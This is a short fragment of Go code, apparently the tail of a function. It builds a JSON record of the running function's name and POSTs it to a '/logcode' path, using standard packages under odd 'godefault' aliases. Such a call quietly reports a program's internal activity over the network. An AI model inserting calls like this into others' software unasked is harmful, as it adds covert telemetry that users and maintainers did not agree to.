	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
